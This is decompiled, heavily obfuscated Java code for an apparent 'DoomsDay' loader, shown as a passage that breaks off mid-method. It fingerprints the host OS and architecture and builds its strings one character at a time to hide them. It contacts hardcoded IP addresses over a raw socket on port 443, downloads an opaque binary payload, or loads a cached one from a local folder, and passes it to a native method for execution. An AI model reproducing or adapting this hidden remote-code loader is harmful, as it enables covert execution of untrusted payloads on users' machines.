package net.java;

import java.util.zip.CRC32;
import java.io.RandomAccessFile;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.net.SocketAddress;
import java.net.InetSocketAddress;
import java.net.InetAddress;
import java.nio.channels.SocketChannel;
import java.io.File;
import java.util.Arrays;
import java.io.PrintStream;
import java.util.Iterator;
import java.util.Map$Entry;
import java.util.Map;

public class l
{
    private static String c;
    private static final int a;
    private static final int b;
    public static Map a;
    public static String a;
    public static String b;
    public static long a;
    public static long b;
    private static volatile boolean a;
    private byte[] a;
    private int c;
    private int d;
    private int e;
    private byte[] b;
    private int f;
    private int g;
    private int h;
    private byte[] c;
    private int i;
    private int j;
    private int k;
    private int l;
    private short[][] a;
    private short[] a;
    private short[] b;
    private short[] c;
    private short[] d;
    private short[] e;
    private short[] f;
    private short[][] b;
    private short[] g;
    private short[] h;
    private short[] i;
    private short[][] c;
    private short[][] d;
    private short[] j;
    private int m;
    private short[] k;
    private short[][] e;
    private short[][] f;
    private short[] l;
    private int n;
    private int o;
    private int p;
    private int q;
    
    static {
        final StringBuilder sb;
        (sb = new StringBuilder()).append('U');
        sb.append('T');
        sb.append('F');
        sb.append('-');
        sb.append('8');
        l.c = sb.toString();
        l.a = (Map)System.getProperties();
        int b2 = -1;
        String lowerCase = null;
        String lowerCase2 = null;
        String lowerCase3 = null;
        final Iterator iterator = l.a.entrySet().iterator();
        while (iterator.hasNext()) {
            final Map$Entry map$Entry;
            final int hashCode = (map$Entry = (Map$Entry)iterator.next()).getKey().hashCode();
            final Object value = map$Entry.getValue();
            if (hashCode == -1228098475) {
                lowerCase = value.toString().toLowerCase();
            }
            else if (hashCode == 1174476494) {
                lowerCase2 = value.toString().toLowerCase();
            }
            else {
                if (hashCode != -1228469728) {
                    continue;
                }
                lowerCase3 = value.toString().toLowerCase();
            }
        }
        Label_0497: {
            if (lowerCase2 != null) {
                final String s = lowerCase2;
                final StringBuilder sb2;
                (sb2 = new StringBuilder()).append('a');
                sb2.append('n');
                sb2.append('d');
                sb2.append('r');
                sb2.append('o');
                sb2.append('i');
                sb2.append('d');
                if (s.contains((CharSequence)sb2.toString())) {
                    b2 = 3;
                    break Label_0497;
                }
            }
            if (lowerCase != null) {
                final String s2 = lowerCase;
                final StringBuilder sb3;
                (sb3 = new StringBuilder()).append('w');
                sb3.append('i');
                sb3.append('n');
                if (s2.contains((CharSequence)sb3.toString())) {
                    b2 = 0;
                }
                else {
                    final String s3 = lowerCase;
                    final StringBuilder sb4;
                    (sb4 = new StringBuilder()).append('l');
                    sb4.append('i');
                    sb4.append('n');
                    sb4.append('u');
                    sb4.append('x');
                    if (s3.contains((CharSequence)sb4.toString())) {
                        b2 = 1;
                    }
                    else {
                        final String s4 = lowerCase;
                        final StringBuilder sb5;
                        (sb5 = new StringBuilder()).append('m');
                        sb5.append('a');
                        sb5.append('c');
                        if (!s4.contains((CharSequence)sb5.toString())) {
                            final String s5 = lowerCase;
                            final StringBuilder sb6;
                            (sb6 = new StringBuilder()).append('o');
                            sb6.append('s');
                            sb6.append('x');
                            if (!s5.contains((CharSequence)sb6.toString())) {
                                final String s6 = lowerCase;
                                final StringBuilder sb7;
                                (sb7 = new StringBuilder()).append('o');
                                sb7.append('s');
                                sb7.append(' ');
                                sb7.append('x');
                                if (!s6.contains((CharSequence)sb7.toString())) {
                                    b2 = -1;
                                    break Label_0497;
                                }
                            }
                        }
                        b2 = 2;
                    }
                }
            }
        }
        b = b2;
        final int hashCode2;
        if ((hashCode2 = lowerCase3.hashCode()) == 93084186 || hashCode2 == -1221096139) {
            a = 2;
            return;
        }
        if (hashCode2 == -806050265 || hashCode2 == 92926582) {
            a = 0;
            return;
        }
        if (hashCode2 == 117110 || hashCode2 == -806050360 || hashCode2 == 3178856 || hashCode2 == 3179817 || hashCode2 == 3180778 || hashCode2 == 3181739) {
            a = 1;
            return;
        }
        a = -1;
    }
    
    public static native Object n(final Object p0);
    
    public static int a(final Object o) {
        final Object[] array2;
        final byte[] array = (byte[])(array2 = (Object[])o)[0];
        final int intValue = (int)array2[1];
        final byte[] array3;
        if ((array3 = (byte[])array2[2]).length == 0) {
            return -1;
        }
        final int n = intValue - array3.length;
        int i = 0;
    Label_0080:
        while (i <= n) {
            for (int j = 0; j < array3.length; ++j) {
                if (array3[j] != array[i + j]) {
                    ++i;
                    continue Label_0080;
                }
            }
            return i;
        }
        return -1;
    }
    
    public static int a(final Object o, final Object o2) {
        final byte[] array = (byte[])o;
        final byte[] array2 = (byte[])o2;
        final int length = array.length;
        if (array2.length == 0) {
            return -1;
        }
        final int n = length - array2.length;
        int i = 0;
    Label_0064:
        while (i <= n) {
            for (int j = 0; j < array2.length; ++j) {
                if (array2[j] != array[i + j]) {
                    ++i;
                    continue Label_0064;
                }
            }
            return i;
        }
        return -1;
    }
    
    private static boolean a(final char c) {
        return (c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f');
    }
    
    private static byte[] a(byte[] array, byte[] array2) {
        byte[] array3 = null;
        final int a;
        if ((a = a((Object)array, (Object)array2)) >= 0) {
            int length = array.length;
            for (int i = a; i < array.length; ++i) {
                if (array[i] == 32) {
                    length = i;
                    break;
                }
            }
            if (length > 0) {
                final byte[] a2;
                array2 = new byte[(array = (a2 = a(array, a + array2.length, length))).length];
                int n = 0;
                for (int j = 0; j < array.length; ++j) {
                    final char c;
                    if ((c = (char)array[j]) == '\\') {
                        if (j + 3 >= array.length) {
                            break;
                        }
                        if (array[j + 1] == 120 && a((char)array[j + 2]) && a((char)array[j + 3])) {
                            final byte[] array4 = array2;
                            final int n2 = n++;
                            final byte b = array[j + 2];
                            final byte b2 = array[j + 3];
                            final byte b3 = b;
                            int n3 = 0;
                            char c2 = '\0';
                            if (b3 >= 48 && b3 <= 57) {
                                n3 = (char)(b3 - 48);
                            }
                            if (b3 >= 65 && b3 <= 70) {
                                n3 = (char)(b3 - 65 + 10);
                            }
                            if (b3 >= 97 && b3 <= 102) {
                                n3 = (char)(b3 - 97 + 10);
                            }
                            if (b2 >= 48 && b2 <= 57) {
                                c2 = (char)(b2 - 48);
                            }
                            if (b2 >= 65 && b2 <= 70) {
                                c2 = (char)(b2 - 65 + 10);
                            }
                            if (b2 >= 97 && b2 <= 102) {
                                c2 = (char)(b2 - 97 + 10);
                            }
                            array4[n2] = (byte)(n3 << 4 | c2);
                        }
                        j += 3;
                    }
                    else {
                        array2[n++] = (byte)c;
                    }
                }
                final byte[] a3 = a(array2, n);
                for (int k = 0; k < array2.length; ++k) {
                    array2[k] = 0;
                }
                final byte[] array5 = a3;
                for (int l = 0; l < a2.length; ++l) {
                    a2[l] = 0;
                }
                array3 = array5;
            }
        }
        return array3;
    }
    
    public static void a(final Object o) {
        if (l.a) {
            return;
        }
        l.a = true;
        final Object[] array2;
        final byte[] array = (byte[])(array2 = (Object[])o)[0];
        final Object o2 = array2[1];
        final int intValue = (int)array2[2];
        final ClassLoader classLoader = (ClassLoader)array2[3];
        final Object o3 = array2[4];
        String s;
        if ((s = (String)array2[5]) != null && s.length() == 0) {
            s = null;
        }
        Object o4 = null;
        Object a = null;
        if (array != null) {
            final byte[] array3 = array;
            final byte[] array4 = { 45, 45, 100, 111, 111, 109, 115, 100, 97, 121, 118, 101, 114, 115, 105, 111, 110, 61 };
            final byte[] a2 = a(array3, array4);
            for (int i = 0; i < 18; ++i) {
                array4[i] = 0;
            }
            o4 = a2;
            final byte[] array5 = array;
            final byte[] array6 = { 45, 45, 99, 111, 110, 102, 105, 103, 115, 116, 111, 114, 97, 103, 101, 61 };
            a = a(array5, array6);
            for (int j = 0; j < 16; ++j) {
                array6[j] = 0;
            }
        }
        final byte[] array7;
        if ((array7 = (byte[])a((Object)new Object[] { s, intValue, o4, a })) != null) {
            try {
                if (!g.a()) {
                    throw new RuntimeException();
                }
                final Object[] array8;
                (array8 = new Object[8])[0] = new long[1];
                array8[1] = new long[] { intValue };
                array8[2] = array;
                array8[3] = o2;
                array8[4] = array7;
                array8[5] = null;
                array8[6] = classLoader;
                array8[7] = o3;
                n(array8);
                for (int k = 0; k < array7.length; ++k) {
                    array7[k] = 0;
                }
                return;
            }
            catch (final Throwable t) {
                final PrintStream out = System.out;
                final StringBuilder sb;
                (sb = new StringBuilder()).append('E');
                sb.append('r');
                sb.append('r');
                sb.append('o');
                sb.append('r');
                sb.append(' ');
                sb.append('l');
                sb.append('o');
                sb.append('a');
                sb.append('d');
                sb.append(' ');
                sb.append('D');
                sb.append('o');
                sb.append('o');
                sb.append('m');
                sb.append('s');
                sb.append('D');
                sb.append('a');
                sb.append('y');
                out.println(sb.toString());
                t.printStackTrace();
                return;
            }
        }
        final PrintStream out2 = System.out;
        final StringBuilder sb2;
        (sb2 = new StringBuilder()).append('E');
        sb2.append('r');
        sb2.append('r');
        sb2.append('o');
        sb2.append('r');
        sb2.append(' ');
        sb2.append('l');
        sb2.append('o');
        sb2.append('a');
        sb2.append('d');
        sb2.append(' ');
        sb2.append('D');
        sb2.append('o');
        sb2.append('o');
        sb2.append('m');
        sb2.append('s');
        sb2.append('D');
        sb2.append('a');
        sb2.append('y');
        sb2.append(' ');
        sb2.append('-');
        sb2.append(' ');
        sb2.append('u');
        sb2.append('p');
        sb2.append('d');
        sb2.append('a');
        sb2.append('t');
        sb2.append('e');
        sb2.append(' ');
        sb2.append('n');
        sb2.append('o');
        sb2.append('t');
        sb2.append(' ');
        sb2.append('f');
        sb2.append('o');
        sb2.append('u');
        sb2.append('n');
        sb2.append('d');
        out2.println(sb2.toString());
    }
    
    private static Object a(Object o) {
        final Object[] array;
        final String s = (String)(array = (Object[])o)[0];
        final int intValue = (int)array[1];
        byte[] array2 = (byte[])array[2];
        o = array[3];
        if (s != null && array2 == null) {
            try {
                final byte[] a;
                if ((a = a(s, null)) != null) {
                    return a;
                }
            }
            catch (final Throwable t) {
                final PrintStream out = System.out;
                final StringBuilder sb;
                (sb = new StringBuilder()).append('S');
                sb.append('t');
                sb.append('o');
                sb.append('r');
                sb.append('e');
                sb.append('d');
                sb.append(' ');
                sb.append('1');
                out.println(sb.toString());
                t.printStackTrace();
            }
        }
        final byte[] array3;
        if (Arrays.equals(array3 = new byte[] { 36, 108, 97, 116, 101, 115, 116, 36 }, array2)) {
            array2 = null;
        }
        for (int i = 0; i < 8; ++i) {
            array3[i] = 0;
        }
        byte[] array4;
        if (((c() && g()) || d()) && (intValue == 4 || intValue == 12)) {
            if ((array4 = (byte[])a((Object)a(o), (Object)array2)) == null) {
                array4 = (byte[])b((Object)array2);
            }
        }
        else if ((array4 = (byte[])b((Object)array2)) == null) {
            array4 = (byte[])a((Object)a(o), (Object)array2);
        }
        if (array4 == null && s != null) {
            try {
                final byte[] a2;
                if ((a2 = a(s, null)) != null) {
                    array4 = a2;
                }
            }
            catch (final Throwable t2) {
                final PrintStream out2 = System.out;
                final StringBuilder sb2;
                (sb2 = new StringBuilder()).append('S');
                sb2.append('t');
                sb2.append('o');
                sb2.append('r');
                sb2.append('e');
                sb2.append('d');
                sb2.append(' ');
                sb2.append('2');
                out2.println(sb2.toString());
                t2.printStackTrace();
            }
        }
        if (intValue != 1) {
            if (intValue != 12) {
                return array4;
            }
        }
        try {
            final byte[] a3;
            if (s != null && (a3 = a(s, null)) != null && array4 != null && a(a3) > a(array4)) {
                array4 = a3;
            }
        }
        catch (final Throwable t3) {
            final PrintStream out3 = System.out;
            final StringBuilder sb3;
            (sb3 = new StringBuilder()).append('S');
            sb3.append('t');
            sb3.append('o');
            sb3.append('r');
            sb3.append('e');
            sb3.append('d');
            sb3.append(' ');
            sb3.append('3');
            out3.println(sb3.toString());
            t3.printStackTrace();
        }
        return array4;
    }
    
    private static String a(Object o) {
        String absolutePath = null;
        if (o != null && o instanceof byte[]) {
            final byte[] array;
            if (!Arrays.equals(array = new byte[] { 36, 100, 101, 102, 97, 117, 108, 116, 36 }, (byte[])o)) {
                try {
                    absolutePath = new String((byte[])o, l.c);
                }
                catch (final Throwable t) {}
            }
            for (int i = 0; i < 9; ++i) {
                array[i] = 0;
            }
        }
        if (absolutePath == null) {
            ((StringBuilder)(o = new StringBuilder())).append('d');
            ((StringBuilder)o).append('o');
            ((StringBuilder)o).append('o');
            ((StringBuilder)o).append('m');
            ((StringBuilder)o).append('s');
            ((StringBuilder)o).append('d');
            ((StringBuilder)o).append('a');
            ((StringBuilder)o).append('y');
            absolutePath = new File(((StringBuilder)o).toString()).getAbsolutePath();
        }
        return absolutePath;
    }
    
    private static Object b(Object o) {
        final byte[] array = { -91, 22, -60, 0 };
        final byte[] array2 = { 42, 3, -80, -64, 0, 2, 0, -48, 0, 0, 0, 0, 20, 44, -32, 1 };
        if (o != null) {
            byte[] bytes = new byte[0];
            if (o instanceof byte[]) {
                bytes = ((byte[])o).clone();
            }
            else if (o instanceof String) {
                try {
                    bytes = ((String)o).getBytes(l.c);
                }
                catch (final Throwable t) {}
            }
            (o = new byte[8 + bytes.length])[0] = 22;
            o[1] = 3;
            o[2] = 100;
            o[3] = (byte)bytes.length;
            for (int i = 0; i < bytes.length; ++i) {
                o[i + 8] = bytes[i];
            }
        }
        else {
            final byte[] array3 = new byte[8];
            array3[0] = 22;
            array3[1] = 3;
            array3[2] = 100;
            o = array3;
        }
        try {
            final SocketChannel open = SocketChannel.open();
            try {
                open.connect((SocketAddress)new InetSocketAddress(InetAddress.getByAddress(array), 443));
            }
            catch (final Throwable t2) {
                open.connect((SocketAddress)new InetSocketAddress(InetAddress.getByAddress(array2), 443));
            }
            final ByteBuffer allocateDirect;
            (allocateDirect = ByteBuffer.allocateDirect(o.length)).put((byte[])o);
            allocateDirect.position(0);
            open.write(allocateDirect);
            allocateDirect.position(0);
            final ByteBuffer byteBuffer = allocateDirect;
            byteBuffer.put(new byte[byteBuffer.limit()]);
            final ByteBuffer allocateDirect2 = ByteBuffer.allocateDirect(4);
            open.read(allocateDirect2);
            final int n;
            if ((n = (0x0 | (allocateDirect2.get(0) & 0xFF) << 24 | (allocateDirect2.get(1) & 0xFF) << 16 | (allocateDirect2.get(2) & 0xFF) << 8 | (allocateDirect2.get(3) & 0xFF))) <= 0) {
                open.close();
                return null;
            }
            allocateDirect2.position(0);
            final ByteBuffer byteBuffer2 = allocateDirect2;
            byteBuffer2.put(new byte[byteBuffer2.limit()]);
            final byte[] array4 = new byte[n];
            final ByteBuffer allocateDirect3 = ByteBuffer.allocateDirect(16384);
            int read;
            for (int n2 = 0; n2 < n && (read = open.read(allocateDirect3)) >= 0; n2 += read) {
                allocateDirect3.position(0);
                allocateDirect3.get(array4, n2, read);
                allocateDirect3.clear();
            }
            open.close();
            allocateDirect3.position(0);
            final ByteBuffer byteBuffer3 = allocateDirect3;
            byteBuffer3.put(new byte[byteBuffer3.limit()]);
            return array4;
        }
        catch (final Exception ex) {
            ex.printStackTrace();
        }
        finally {
            for (int j = 0; j < o.length; ++j) {
                o[j] = false;
            }
            for (int k = 0; k < 4; ++k) {
                array[k] = 0;
            }
            for (int l = 0; l < 16; ++l) {
                array2[l] = 0;
            }
        }
        return null;
    }
    
    public static byte[] a(final String name, final String s) {
        try {
            final InputStream resourceAsStream;
            if ((resourceAsStream = l.class.getResourceAsStream(name)) != null) {
                final byte[] array = new byte[16384];
                final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(resourceAsStream.available());
                int read;
                while ((read = resourceAsStream.read(array)) != -1) {
                    byteArrayOutputStream.write(array, 0, read);
                }
                resourceAsStream.close();
                return byteArrayOutputStream.toByteArray();
            }
            if (s != null) {
                return (byte[])b((Object)s);
            }
            return null;
        }
        catch (final Exception ex) {
            throw new RuntimeException((Throwable)ex);
        }
    }
    
    private static Object a(final Object o, final Object o2) {
        File file;
        if (o instanceof String) {
            file = new File((String)o);
        }
        else {
            file = (File)o;
        }
        byte[] array = null;
        Object byteArray = null;
        ByteArrayOutputStream byteArrayOutputStream = null;
        int n = 0;
        try {
            final File[] listFiles;
            if ((listFiles = file.listFiles()) == null) {
                return null;
            }
            for (int i = 0; i < listFiles.length; ++i) {
                final String name;
                final int a;
                if ((name = listFiles[i].getName()).length() > 8 && name.length() < 20 && (a = a(name)) > 0) {
                    if (byteArrayOutputStream == null) {
                        byteArrayOutputStream = new ByteArrayOutputStream(1310720);
                    }
                    if (array == null) {
                        array = new byte[65536];
                    }
                    byteArrayOutputStream.reset();
                    final File file2 = listFiles[i];
                    final StringBuilder sb;
                    (sb = new StringBuilder()).append('r');
                    final RandomAccessFile randomAccessFile = new RandomAccessFile(file2, sb.toString());
                    Label_0239: {
                        if (o2 != null) {
                            final byte[] array2 = new byte[64];
                            randomAccessFile.readFully(array2);
                            if (!Arrays.equals(c(array2), (byte[])o2)) {
                                break Label_0239;
                            }
                            byteArrayOutputStream.write(array2);
                        }
                        if (a > n) {
                            int read;
                            while ((read = randomAccessFile.read(array)) >= 0) {
                                byteArrayOutputStream.write(array, 0, read);
                            }
                            byteArray = byteArrayOutputStream.toByteArray();
                            n = a;
                        }
                    }
                    randomAccessFile.close();
                }
            }
        }
        catch (final Throwable t) {
            t.printStackTrace();
        }
        return byteArray;
    }
    
    public static void b(final Object o) {
        try {
            final Object[] array;
            final File file = (File)(array = (Object[])o)[0];
            final byte[] array2 = (byte[])array[1];
            final File file2 = file;
            final StringBuilder sb;
            (sb = new StringBuilder()).append('r');
            sb.append('w');
            final RandomAccessFile randomAccessFile;
            (randomAccessFile = new RandomAccessFile(file2, sb.toString())).write(array2);
            randomAccessFile.close();
        }
        catch (final Throwable t) {}
    }
    
    private static byte[] c(byte[] array) {
        array = array.clone();
        int n = 0;
        for (int i = 6; i < 64; ++i) {
            final byte[] array2 = array;
            final int n2 = i;
            array2[n2] ^= 0x47;
            if (array[i] == 0 && n == 0) {
                n = i;
            }
        }
        if (n == 0) {
            n = 64;
        }
        return a(array, 6, n);
    }
    
    private static int a(final byte[] array) {
        return 0 + ((array[0] & 0xFF) << 24) + ((array[1] & 0xFF) << 16) + ((array[2] & 0xFF) << 8) + (array[3] & 0xFF);
    }
    
    private static int a(final String s) {
        try {
            if (s == null) {
                final StringBuilder sb;
                (sb = new StringBuilder()).append('n');
                sb.append('u');
                sb.append('l');
                sb.append('l');
                throw new NumberFormatException(sb.toString());
            }
            final int length;
            if ((length = s.length()) <= 0) {
                throw new IllegalArgumentException();
            }
            if (s.charAt(0) == '-') {
                final StringBuilder sb2;
                (sb2 = new StringBuilder()).append('I');
                sb2.append('l');
                sb2.append('l');
                sb2.append('e');
                sb2.append('g');
                sb2.append('a');
                sb2.append('l');
                sb2.append(' ');
                sb2.append('l');
                sb2.append('e');
                sb2.append('a');
                sb2.append('d');
                sb2.append('i');
                sb2.append('n');
                sb2.append('g');
                sb2.append(' ');
                sb2.append('m');
                sb2.append('i');
                sb2.append('n');
                sb2.append('u');
                sb2.append('s');
                sb2.append(' ');
                sb2.append('s');
                sb2.append('i');
                sb2.append('g');
                sb2.append('n');
                sb2.append(' ');
                sb2.append('o');
                sb2.append('n');
                sb2.append(' ');
                sb2.append('u');
                sb2.append('n');
                sb2.append('s');
                sb2.append('i');
                sb2.append('g');
                sb2.append('n');
                sb2.append('e');
                sb2.append('d');
                sb2.append(' ');
                sb2.append('s');
                sb2.append('t');
                sb2.append('r');
                sb2.append('i');
                sb2.append('n');
                sb2.append('g');
                sb2.append(' ');
                sb2.append('%');
                sb2.append('s');
                sb2.append('.');
                throw new NumberFormatException(String.format(sb2.toString(), new Object[] { s }));
            }
            long long1;
            if (length <= 12) {
                long1 = Long.parseLong(s, 32);
            }
            else {
                final long long2 = Long.parseLong(s.substring(0, length - 1), 32);
                final int digit;
                if ((digit = Character.digit(s.charAt(length - 1), 32)) < 0) {
                    final StringBuilder sb3;
                    (sb3 = new StringBuilder()).append('B');
                    sb3.append('a');
                    sb3.append('d');
                    sb3.append(' ');
                    sb3.append('d');
                    sb3.append('i');
                    sb3.append('g');
                    sb3.append('i');
                    sb3.append('t');
                    sb3.append(' ');
                    sb3.append('a');
                    sb3.append('t');
                    sb3.append(' ');
                    sb3.append('e');
                    sb3.append('n');
                    sb3.append('d');
                    sb3.append(' ');
                    sb3.append('o');
                    sb3.append('f');
                    sb3.append(' ');
                    throw new NumberFormatException(sb3.toString() + s);
                }
                final long n2;
                final long n = (n2 = (long2 << 5) + digit) + Long.MIN_VALUE;
                final long n3 = long2 + Long.MIN_VALUE;
                final long n4 = n;
                if (((n < n3) ? -1 : ((n4 == n3) ? false : true)) < 0) {
                    final StringBuilder sb4;
                    (sb4 = new StringBuilder()).append('S');
                    sb4.append('t');
                    sb4.append('r');
                    sb4.append('i');
                    sb4.append('n');
                    sb4.append('g');
                    sb4.append(' ');
                    sb4.append('v');
                    sb4.append('a');
                    sb4.append('l');
                    sb4.append('u');
                    sb4.append('e');
                    sb4.append(' ');
                    sb4.append('%');
                    sb4.append('s');
                    sb4.append(' ');
                    sb4.append('e');
                    sb4.append('x');
                    sb4.append('c');
                    sb4.append('e');
                    sb4.append('e');
                    sb4.append('d');
                    sb4.append('s');
                    sb4.append(' ');
                    sb4.append('r');
                    sb4.append('a');
                    sb4.append('n');
                    sb4.append('g');
                    sb4.append('e');
                    sb4.append(' ');
                    sb4.append('o');
                    sb4.append('f');
                    sb4.append(' ');
                    sb4.append('u');
                    sb4.append('n');
                    sb4.append('s');
                    sb4.append('i');
                    sb4.append('g');
                    sb4.append('n');
                    sb4.append('e');
                    sb4.append('d');
                    sb4.append(' ');
                    sb4.append('l');
                    sb4.append('o');
                    sb4.append('n');
                    sb4.append('g');
                    sb4.append('.');
                    throw new NumberFormatException(String.format(sb4.toString(), new Object[] { s }));
                }
                long1 = n2;
            }
            final long n5 = long1 ^ 0x423FE7DE882BA5F9L;
            final byte[] array;
            (array = new byte[8])[0] = (byte)(n5 >>> 56 & 0xFFL);
            array[1] = (byte)(n5 >>> 48 & 0xFFL);
            array[2] = (byte)(n5 >>> 40 & 0xFFL);
            array[3] = (byte)(n5 >>> 32 & 0xFFL);
            array[4] = (byte)(n5 >>> 24 & 0xFFL);
            array[5] = (byte)(n5 >>> 16 & 0xFFL);
            array[6] = (byte)(n5 >>> 8 & 0xFFL);
            array[7] = (byte)(n5 & 0xFFL);
            final short n6 = (short)((short)(0 + ((array[6] & 0xFF) << 8)) + (array[7] & 0xFF));
            final CRC32 crc32;
            (crc32 = new CRC32()).update(array, 0, 6);
            if ((short)crc32.getValue() != n6) {
                return -2;
            }
            return 0 + ((array[1] & 0xFF) << 24) + ((array[2] & 0xFF) << 16) + ((array[3] & 0xFF) << 8) + (array[4] & 0xFF);
        }
        catch (final NumberFormatException ex) {}
        catch (final Exception ex2) {
            ex2.printStackTrace();
        }
        return -1;
    }
    
    public static final byte[] a(final byte[] array) {
        final byte[] array2 = new byte[array.length];
        int length;
        for (length = array.length; length - 1 > 0 && array[length - 1] == 61; --length) {}
        if (length - 1 == 0) {
            return null;
        }
        final byte[] array3 = new byte[length * 3 / 4];
        for (int i = 0; i < length; ++i) {
            if (array[i] == 43) {
                array2[i] = 62;
            }
            else if (array[i] == 47) {
                array2[i] = 63;
            }
            else if (array[i] < 58) {
                array2[i] = (byte)(array[i] + 52 - 48);
            }
            else if (array[i] < 91) {
                array2[i] = (byte)(array[i] - 65);
            }
            else if (array[i] < 123) {
                array2[i] = (byte)(array[i] + 26 - 97);
            }
        }
        int n;
        int n2;
        for (n = 0, n2 = 0; n < length && n2 < array3.length / 3 * 3; array3[n2++] = (byte)((array2[n] << 2 & 0xFC) | (array2[n + 1] >>> 4 & 0x3)), array3[n2++] = (byte)((array2[n + 1] << 4 & 0xF0) | (array2[n + 2] >>> 2 & 0xF)), array3[n2++] = (byte)((array2[n + 2] << 6 & 0xC0) | (array2[n + 3] & 0x3F)), n += 4) {}
        if (n < length) {
            if (n < length - 2) {
                array3[n2++] = (byte)((array2[n] << 2 & 0xFC) | (array2[n + 1] >>> 4 & 0x3));
                array3[n2] = (byte)((array2[n + 1] << 4 & 0xF0) | (array2[n + 2] >>> 2 & 0xF));
            }
            else if (n < length - 1) {
                array3[n2] = (byte)((array2[n] << 2 & 0xFC) | (array2[n + 1] >>> 4 & 0x3));
            }
        }
        return array3;
    }
    
    public static boolean a() {
        return l.b == 0;
    }
    
    public static boolean b() {
        return l.b == 2;
    }
    
    public static boolean c() {
        return l.b == 1;
    }
    
    public static boolean d() {
        return l.b == 3;
    }
    
    public static boolean e() {
        return l.a == 1;
    }
    
    public static boolean f() {
        return l.a == 0;
    }
    
    public static boolean g() {
        return l.a == 2;
    }
    
    private void a() {
        this.b();
        this.b = null;
    }
    
    private void b() {
        final int n;
        if ((n = this.c - this.e) == 0) {
            return;
        }
        for (int i = 0; i < n; ++i) {
            this.b[i + this.f] = this.a[this.e + i];
        }
        this.f += n;
        if (this.c >= this.d) {
            this.c = 0;
        }
        this.e = this.c;
    }
    
    private byte a(int n) {
        if ((n = this.c - n - 1) < 0) {
            n += this.d;
        }
        return this.a[n];
    }
    
    private int a() {
        return this.c[this.i++] & 0xFF;
    }
    
    private int a(final Object o, final int n) {
        final short[] array;
        final short n2 = (array = (short[])o)[n];
        final int g = (this.g >>> 11) * n2;
        if ((this.h ^ Integer.MIN_VALUE) < (g ^ Integer.MIN_VALUE)) {
            this.g = g;
            array[n] = (short)(n2 + (2048 - n2 >>> 5));
            if ((this.g & 0xFF000000) == 0x0) {
                this.h = (this.h << 8 | this.a());
                this.g <<= 8;
            }
            return 0;
        }
        this.g -= g;
        this.h -= g;
        final short[] array2 = array;
        final short n3 = n2;
        array2[n] = (short)(n3 - (n3 >>> 5));
        if ((this.g & 0xFF000000) == 0x0) {
            this.h = (this.h << 8 | this.a());
            this.g <<= 8;
        }
        return 1;
    }
    
    private static void c(final Object o) {
        final short[] array = (short[])o;
        for (int i = 0; i < array.length; ++i) {
            array[i] = 1024;
        }
    }
    
    public l() {
        this.d = 0;
        this.a = new short[192];
        this.b = new short[12];
        this.c = new short[12];
        this.d = new short[12];
        this.e = new short[12];
        this.f = new short[192];
        this.b = new short[4][];
        this.g = new short[114];
        this.h = new short[16];
        this.i = new short[2];
        this.c = new short[16][];
        this.d = new short[16][];
        this.j = new short[256];
        this.m = 0;
        this.k = new short[2];
        this.e = new short[16][];
        this.f = new short[16][];
        this.l = new short[256];
        this.n = 0;
        this.o = -1;
        this.p = -1;
        for (int i = 0; i < 4; ++i) {
            this.b[i] = new short[64];
        }
    }
    
    private int b(final Object o) {
        final short[] array = (short[])o;
        final int n = 31 - a(array.length);
        int n2 = 1;
        for (int i = n; i != 0; --i) {
            n2 = (n2 << 1) + this.a(array, n2);
        }
        return n2 - (1 << n);
    }
    
    private static int a(int n) {
        if (n == 0) {
            return 32;
        }
        int n2 = 1;
        if (n >>> 16 == 0) {
            n2 += 16;
            n <<= 16;
        }
        if (n >>> 24 == 0) {
            n2 += 8;
            n <<= 8;
        }
        if (n >>> 28 == 0) {
            n2 += 4;
            n <<= 4;
        }
        if (n >>> 30 == 0) {
            n2 += 2;
            n <<= 2;
        }
        return n2 - (n >>> 31);
    }
    
    private boolean a(final byte[] c, final byte[] b) {
        final long n = b.length;
        this.c = c;
        this.i = 13;
        this.a();
        this.b = b;
        this.e = 0;
        this.c = 0;
        c(this.a);
        c(this.f);
        c(this.b);
        c(this.c);
        c(this.d);
        c(this.e);
        c(this.g);
        for (int n2 = 1 << this.j + this.k, i = 0; i < n2; ++i) {
            c(this.a[i]);
        }
        for (int j = 0; j < 4; ++j) {
            c(this.b[j]);
        }
        c(this.i);
        for (int k = 0; k < this.m; ++k) {
            c(this.c[k]);
            c(this.d[k]);
        }
        c(this.j);
        c(this.k);
        for (int l = 0; l < this.n; ++l) {
            c(this.e[l]);
            c(this.f[l]);
        }
        c(this.l);
        c(this.h);
        this.h = 0;
        this.g = -1;
        for (int n3 = 0; n3 < 5; ++n3) {
            this.h = (this.h << 8 | this.a());
        }
        int n4 = 0;
        int n5 = 0;
        int n6 = 0;
        int n7 = 0;
        int n8 = 0;
        long n9 = 0L;
        byte a = 0;
        while (n < 0L || n9 < n) {
            final int n10 = (int)n9 & this.q;
            if (this.a(this.a, (n4 << 4) + n10) == 0) {
                final short[] array = this.a[(((int)n9 & this.l) << this.j) + ((a & 0xFF) >>> 8 - this.j)];
                if (n4 >= 7) {
                    byte a2 = this.a(n5);
                    int n11 = 1;
                    do {
                        final int n12 = a2 >> 7 & 0x1;
                        a2 <<= 1;
                        final int a3 = this.a(array, (n12 + 1 << 8) + n11);
                        n11 = (n11 << 1 | a3);
                        if (n12 != a3) {
                            while (n11 < 256) {
                                n11 = (n11 << 1 | this.a(array, n11));
                            }
                            break;
                        }
                    } while (n11 < 256);
                    a = (byte)n11;
                }
                else {
                    int n13 = 1;
                    while ((n13 = (n13 << 1 | this.a(array, n13))) < 256) {}
                    a = (byte)n13;
                }
                this.a[this.c++] = a;
                if (this.c >= this.d) {
                    this.b();
                }
                final int n14;
                n4 = (((n14 = n4) < 4) ? 0 : ((n14 < 10) ? (n14 - 3) : (n14 - 6)));
                ++n9;
            }
            else {
                int n15;
                if (this.a(this.b, n4) == 1) {
                    n15 = 0;
                    if (this.a(this.c, n4) == 0) {
                        if (this.a(this.f, (n4 << 4) + n10) == 0) {
                            n4 = ((n4 < 7) ? 9 : 11);
                            n15 = 1;
                        }
                    }
                    else {
                        int n16;
                        if (this.a(this.d, n4) == 0) {
                            n16 = n6;
                        }
                        else {
                            if (this.a(this.e, n4) == 0) {
                                n16 = n7;
                            }
                            else {
                                n16 = n8;
                                n8 = n7;
                            }
                            n7 = n6;
                        }
                        n6 = n5;
                        n5 = n16;
                    }
                    if (n15 == 0) {
                        int b2;
                        if (this.a(this.k, 0) == 0) {
